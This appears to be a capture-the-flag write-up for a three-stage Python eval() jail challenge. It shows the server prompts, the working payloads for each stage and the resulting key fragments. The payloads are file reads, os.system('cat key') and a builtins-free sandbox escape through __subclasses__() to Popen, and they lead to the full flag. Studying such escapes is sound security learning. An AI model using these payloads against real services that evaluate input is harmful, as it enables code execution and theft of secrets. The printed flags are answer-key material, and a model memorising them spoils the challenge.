Please give me an equation! Any equation! I need to be fed some data to do some processing!I'm super secure, and can use all python! I just use `eval()` on your data and then whamo, python does all the work!Whatever you do, don't look at my ./key!

Give me an equation please!

open('key').read()
sun{eval_is

If you completed part 1 of the challenge...

Your princess is in another castle! üî•üè∞üî•

Please give me an equation! Any equation! I need to be fed some data to do some processing!Due to technical difficulties with the last challenge, I've upped my ante! Now I know it's secure!I'm super secure, and can use most python math! I just use `eval(client_input, \{\}, safe_math_functions)` on your data and then whamo, python does all the work!Whatever you do, don't look at my ./key!

Halt in the name of the law!

What was the ./key found in the previous challenge?

sun{eval_is
Give me an equation please!

__import__('os').system('cat key')
_safe_

If you completed part 2 of the challenge...

You need sequels. MORE SEQUELS!! üî•üè∞üî•

Please give me an equation! Any equation! I need to be fed some data to do some processing!Due to technical difficulties with the previous set, I had to remove math lib support! In fact the only thing this can do is add and subtract now!... I think. Google tells me that it's secure now! Well the second result anyhow.I'm super secure, and can use a bit of python math! I just use `eval(client_input, {'__builtins__':\{\}})` on your data and then whamo, python does all the work!Whatever you do, don't look at my ./key!

Halt in the name of the law!

What was the ./key found in the previous challenge?

_safe_
Give me an equation please!

().__class__.__base__.__subclasses__()[219](('cat','key'),stdout=-1).communicate().__getitem__(0)
b'only_if_you_ast_whitelist_first}'

If you completed part 3 of the challenge...

 just sum the three clues together to get the flag. It's a three-part equation, very complicated.





The flag is: sun{eval_is_safe_only_if_you_ast_whitelist_first}
